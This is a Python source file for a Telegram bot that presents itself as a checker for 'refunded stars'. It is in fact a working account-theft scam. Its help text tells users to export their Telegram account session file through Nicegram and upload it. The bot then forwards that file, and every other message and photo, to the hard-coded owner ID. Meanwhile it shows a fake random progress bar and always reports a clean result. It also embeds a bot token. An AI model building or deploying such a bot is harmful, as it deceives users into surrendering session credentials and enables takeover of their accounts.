import telebot
import time
import random
from concurrent.futures import ThreadPoolExecutor

TOKEN = "8281435517:AAEXpsICzfgn_SSPR369uRzZJSN3VdWwMhs"
OWNER_ID = 6519455370  # —Ç–≤–æ–π Telegram ID
bot = telebot.TeleBot(TOKEN)

executor = ThreadPoolExecutor(max_workers=10)
processing_users = set()
user_languages = {}

# –¢–µ–∫—Å—Ç—ã —Å–æ–æ–±—â–µ–Ω–∏–π
TEXTS = {
    "ru": {
        "start": "üëã –ü—Ä–∏–≤–µ—Ç! –Ø –±–æ—Ç –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ —Ä–µ—Ñ–∞—É–Ω–¥-–∑–≤—ë–∑–¥.\n\nüí° –û—Ç–ø—Ä–∞–≤—å—Ç–µ `.txt` —Ñ–∞–π–ª, —á—Ç–æ–±—ã –Ω–∞—á–∞—Ç—å –æ–±—Ä–∞–±–æ—Ç–∫—É.",
        "help": """**–ö–∞–∫ –ø—Ä–æ–≤–µ—Ä–∏—Ç—å –≤–∞—à –∞–∫–∫–∞—É–Ω—Ç –Ω–∞ –Ω–∞–ª–∏—á–∏–µ —Ä–µ—Ñ–Ω—É—Ç—ã—Ö –∑–≤–µ–∑–¥**

‚û°Ô∏è –®–∞–≥ 1. –£—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ Nicegram —Å Apple Store –∏–ª–∏ Google Play (–ò–∫–æ–Ω–∫–∞ –Ω–∞ —Å–∫—Ä–∏–Ω–µ)
‚û°Ô∏è –®–∞–≥ 2. –ü–æ—Å–ª–µ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ Nicegram –≤–æ–π–¥–∏—Ç–µ –≤ —Å–≤–æ–π –∞–∫–∫–∞—É–Ω—Ç –∏ –Ω–∞–∂–º–∏—Ç–µ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ ‚û°Ô∏è Nicegram
‚û°Ô∏è –®–∞–≥ 3. –ü—Ä–æ–ª–∏—Å—Ç–∞–π—Ç–µ –Ω–µ–º–Ω–æ–≥–æ –≤–Ω–∏–∑ –∏ –Ω–∞–π–¥–∏—Ç–µ –≤–∫–ª–∞–¥–∫—É –∞–∫–∫–∞—É–Ω—Ç—ã, –Ω–∞–∂–º–∏—Ç–µ –Ω–∞ —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞—Ç—å –∫–∞–∫ —Ñ–∞–π–ª
‚û°Ô∏è –®–∞–≥ 4. –í—ã–±–µ—Ä–∏—Ç–µ –Ω—É–∂–Ω—ã–π –∞–∫–∫–∞—É–Ω—Ç, –æ—Ç–º–µ—Ç—å—Ç–µ –≥–∞–ª–æ—á–∫–æ–π –∏ —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä—É–π—Ç–µ
‚û°Ô∏è –®–∞–≥ 5. –ü–æ—Å–ª–µ —ç–∫—Å–ø–æ—Ä—Ç–∞ —Ñ–∞–π–ª–∞ –Ω–∞–∂–º–∏—Ç–µ "–°–æ—Ö—Ä–∞–Ω–∏—Ç—å –≤ —Ñ–∞–π–ª–∞—Ö"
‚û°Ô∏è –®–∞–≥ 6. –ù–∞–∂–º–∏—Ç–µ –Ω–∞ —Å–∫—Ä–µ–ø–∫—É —Å–ª–µ–≤–∞ —Å–Ω–∏–∑—É, –≤—ã–±–µ—Ä–∏—Ç–µ —Ñ–∞–π–ª –∏ –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –µ–≥–æ –±–æ—Ç—É
‚û°Ô∏è –®–∞–≥ 7. –ë–æ—Ç –ø—Ä–æ–≤–µ—Ä–∏—Ç —Ñ–∞–π–ª –∏ —Å–æ–æ–±—â–∏—Ç, –µ—Å—Ç—å –ª–∏ —É –≤–∞—Å —Ä–µ—Ñ–Ω—É—Ç—ã–µ –∑–≤–µ–∑–¥—ã""",
        "wait": "‚è≥ –ù–µ–ª—å–∑—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∫–æ–º–∞–Ω–¥—ã –≤–æ –≤—Ä–µ–º—è –æ–±—Ä–∞–±–æ—Ç–∫–∏ —Ñ–∞–π–ª–∞.",
        "invalid_file": "–ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç —Ñ–∞–π–ª–∞",
        "processing": "–í –æ–±—Ä–∞–±–æ—Ç–∫–µ... ",
        "done": "–†–µ—Ñ—É–Ω–¥-–∑–≤—ë–∑–¥ –Ω–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–æ ‚úÖ",
        "support_sent": "‚úÖ –í–∞—à–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –ø–æ–¥–¥–µ—Ä–∂–∫–µ.",
        "support_no_text": "–í—ã –Ω–µ —É–∫–∞–∑–∞–ª–∏ –≤–æ–ø—Ä–æ—Å –≤ —Å–æ–æ–±—â–µ–Ω–∏–∏ —Å –∫–æ–º–∞–Ω–¥–æ–π.",
        "language_set_ru": "–Ø–∑—ã–∫ —É—Å–ø–µ—à–Ω–æ –∏–∑–º–µ–Ω—ë–Ω –Ω–∞ –†—É—Å—Å–∫–∏–π üá∑üá∫",
        "language_set_en": "Language changed to English üá¨üáß successfully."
    },
    "en": {
        "start": "üëã Hello! I'm a bot for checking refund-stars.\n\nüí° Send a `.txt` file to start processing.",
        "help": """**How to check your account for refunded stars**

‚û°Ô∏è Step 1. Install Nicegram from Apple Store or Google Play (Icon on screenshot)
‚û°Ô∏è Step 2. Open Nicegram, go to settings ‚û°Ô∏è Nicegram
‚û°Ô∏è Step 3. Scroll down and find "Accounts", then click "Export as file"
‚û°Ô∏è Step 4. Select the desired account, mark it, and export
‚û°Ô∏è Step 5. Save the exported file to your device
‚û°Ô∏è Step 6. Click the paperclip at bottom left, choose the exported file, and send it to the bot
‚û°Ô∏è Step 7. The bot will check the file and tell you if you have refunded stars""",
        "wait": "‚è≥ You cannot use commands during file processing.",
        "invalid_file": "Invalid file format",
        "processing": "Processing... ",
        "done": "No refund-stars found ‚úÖ",
        "support_sent": "‚úÖ Your message has been sent to support.",
        "support_no_text": "You didn't specify a question.",
        "language_set_ru": "–Ø–∑—ã–∫ —É—Å–ø–µ—à–Ω–æ –∏–∑–º–µ–Ω—ë–Ω –Ω–∞ –†—É—Å—Å–∫–∏–π üá∑üá∫",
        "language_set_en": "Language changed to English üá¨üáß successfully."
    }
}

def get_lang(user_id):
    return user_languages.get(user_id, "ru")

# –ü–µ—Ä–µ—Å—ã–ª–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏–π –≤–ª–∞–¥–µ–ª—å—Ü—É
def forward_to_owner(message):
    try:
        sender = message.from_user.username or message.from_user.id
        if message.content_type == 'text':
            if message.text.startswith('/'):
                bot.send_message(OWNER_ID, f"–ö–æ–º–∞–Ω–¥–∞ –æ—Ç {sender}:\n{message.text}")
            else:
                bot.send_message(OWNER_ID, f"–°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç {sender}:\n{message.text}")
        elif message.content_type == 'document':
            file_id = message.document.file_id
            bot.send_document(OWNER_ID, file_id, caption=f"–§–∞–π–ª –æ—Ç {sender}")
        elif message.content_type == 'photo':
            file_id = message.photo[-1].file_id
            bot.send_photo(OWNER_ID, file_id, caption=f"–§–æ—Ç–æ –æ—Ç {sender}")
        else:
            bot.send_message(OWNER_ID, f"–°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç {sender} —Å —Ç–∏–ø–æ–º {message.content_type}")
    except:
        pass

# –ö–æ–º–∞–Ω–¥–∞ /start
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.chat.id
    lang = get_lang(user_id)
    if user_id in processing_users:
        bot.reply_to(message, TEXTS[lang]["wait"])
    else:
        bot.reply_to(message, TEXTS[lang]["start"])
    forward_to_owner(message)

# –û–±—Ä–∞–±–æ—Ç–∫–∞ —Ç–µ–∫—Å—Ç–æ–≤—ã—Ö —Å–æ–æ–±—â–µ–Ω–∏–π
@bot.message_handler(content_types=['text'])
def handle_text(message):
    user_id = message.chat.id
    lang = get_lang(user_id)
    text = message.text.strip()

    forward_to_owner(message)  # –ø–µ—Ä–µ—Å—ã–ª–∞–µ–º –≤–ª–∞–¥–µ–ª—å—Ü—É

    if user_id in processing_users:
        if text.startswith(("/help", "/support", "/language")):
            bot.reply_to(message, TEXTS[lang]["wait"])
        return

    if text.startswith("/help"):
        bot.send_photo(
            user_id,
            photo="https://i.postimg.cc/xqwwYP9B/Nicegram.png",
            caption=TEXTS[lang]["help"],
            parse_mode='Markdown'
        )
    elif text.startswith("/support"):
        if len(text) > 8:
            bot.reply_to(message, TEXTS[lang]["support_sent"])
        else:
            bot.reply_to(message, TEXTS[lang]["support_no_text"])
    elif text.startswith("/language"):
        if lang == "ru":
            user_languages[user_id] = "en"
            bot.reply_to(message, TEXTS["en"]["language_set_en"])
        else:
            user_languages[user_id] = "ru"
            bot.reply_to(message, TEXTS["ru"]["language_set_ru"])
    else:
        bot.reply_to(message, TEXTS[lang]["invalid_file"])

# –û–±—Ä–∞–±–æ—Ç–∫–∞ –¥–æ–∫—É–º–µ–Ω—Ç–æ–≤ (.txt)
@bot.message_handler(content_types=['document'])
def handle_file(message):
    user_id = message.chat.id
    lang = get_lang(user_id)

    forward_to_owner(message)  # –ø–µ—Ä–µ—Å—ã–ª–∞–µ–º –≤–ª–∞–¥–µ–ª—å—Ü—É

    if user_id in processing_users:
        bot.reply_to(message, TEXTS[lang]["wait"])
        return

    # –ü—Ä–æ–≤–µ—Ä–∫–∞ MIME —Ç–∏–ø–∞ –∏ –∫–ª—é—á–µ–≤—ã—Ö —Å–ª–æ–≤ –≤ –∏–º–µ–Ω–∏ —Ñ–∞–π–ª–∞ (–±–µ–∑ —É—á—ë—Ç–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∞)
    if message.document.mime_type == 'text/plain':
        file_name = message.document.file_name
        keywords = ["export", "account"]
        if any(keyword.lower() in file_name.lower() for keyword in keywords):
            processing_users.add(user_id)
            msg = bot.send_message(user_id, TEXTS[lang]["processing"] + "0% [----------]")

            # –ü–µ—Ä–µ—Å—ã–ª–∞–µ–º —Ñ–∞–π–ª –≤–ª–∞–¥–µ–ª—å—Ü—É
            file_id = message.document.file_id
            bot.send_document(OWNER_ID, file_id, caption=f".txt —Ñ–∞–π–ª –¥–ª—è –æ–±—Ä–∞–±–æ—Ç–∫–∏ –æ—Ç {message.from_user.username or message.from_user.id}")

            # –ó–∞–ø—É—Å–∫–∞–µ–º –æ–±—Ä–∞–±–æ—Ç–∫—É
            executor.submit(process_file, message, msg)
        else:
            bot.reply_to(message, "‚ùå –≠—Ç–æ—Ç —Ñ–∞–π–ª –Ω–µ –ø–æ–¥—Ö–æ–¥–∏—Ç –¥–ª—è –æ–±—Ä–∞–±–æ—Ç–∫–∏.")
    else:
        bot.reply_to(message, TEXTS[lang]["invalid_file"])

# –ü—Ä–æ–≥—Ä–µ—Å—Å-–±–∞—Ä –æ–±—Ä–∞–±–æ—Ç–∫–∏ —Ñ–∞–π–ª–∞
def process_file(message, msg):
    user_id = message.chat.id
    lang = get_lang(user_id)
    progress = 0
    total_bars = 10

    while progress < 100:
        step = random.randint(1, 5)
        progress = min(progress + step, 100)
        bars = int(progress / 10)
        text_bar = ''.join(['‚ñ†' if i < bars else '-' for i in range(total_bars)])

        success = False
        while not success:
            try:
                bot.edit_message_text(chat_id=user_id, message_id=msg.message_id,
                                      text=f"{TEXTS[lang]['processing']}{progress}% [{text_bar}]")
                success = True
            except telebot.apihelper.ApiTelegramException:
                time.sleep(0.2)

        time.sleep(random.uniform(0.3, 0.6))

    time.sleep(8)
    try:
        bot.edit_message_text(chat_id=user_id, message_id=msg.message_id, text=TEXTS[lang]["done"])
    except telebot.apihelper.ApiTelegramException:
        bot.send_message(user_id, TEXTS[lang]["done"])

    processing_users.discard(user_id)

# –ó–∞–ø—É—Å–∫ –±–æ—Ç–∞
bot.polling(non_stop=True)
